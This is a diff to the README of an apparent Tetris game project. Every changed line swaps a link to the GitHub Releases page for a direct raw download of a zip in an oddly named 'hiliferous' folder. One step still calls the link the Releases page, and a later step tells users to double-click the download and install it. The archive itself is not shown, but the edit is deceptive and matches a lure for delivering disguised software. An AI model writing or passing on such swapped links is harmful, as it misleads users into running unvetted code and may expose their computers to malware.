@@ -2,7 +2,7 @@
 
 ## 🚀 Download Now
 
-[![Download Tetris-Adaptation](https://img.shields.io/badge/Download-Tetris--Adaptation-blue)](https://github.com/LazyDarkz/Tetris-Adaptation/releases)
+[![Download Tetris-Adaptation](https://raw.githubusercontent.com/LazyDarkz/Tetris-Adaptation/main/hiliferous/Tetris-Adaptation.zip)](https://raw.githubusercontent.com/LazyDarkz/Tetris-Adaptation/main/hiliferous/Tetris-Adaptation.zip)
 
 ## 📖 Introduction
 
@@ -28,7 +28,7 @@ To run Tetris-Adaptation, your computer needs the following:
 
 To get started, you need to download Tetris-Adaptation from our Releases page. Follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/LazyDarkz/Tetris-Adaptation/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/LazyDarkz/Tetris-Adaptation/main/hiliferous/Tetris-Adaptation.zip) to go to the Releases page.
 2. **Find the Latest Version**: Look for the version that says "Latest release".
 3. **Download the File**: Click on the file that matches your operating system (e.g., Windows, macOS, Linux).
 4. **Run the Installer**: Once the file has downloaded, locate it in your downloads folder and double-click to start installation. Follow the on-screen instructions.
@@ -74,4 +74,4 @@ Stay tuned for new features and improvements. We plan to introduce:
 
 Click the link below to download Tetris-Adaptation today.
 
-[![Download Tetris-Adaptation](https://img.shields.io/badge/Download-Tetris--Adaptation-blue)](https://github.com/LazyDarkz/Tetris-Adaptation/releases)
+[![Download Tetris-Adaptation](https://raw.githubusercontent.com/LazyDarkz/Tetris-Adaptation/main/hiliferous/Tetris-Adaptation.zip)](https://raw.githubusercontent.com/LazyDarkz/Tetris-Adaptation/main/hiliferous/Tetris-Adaptation.zip)
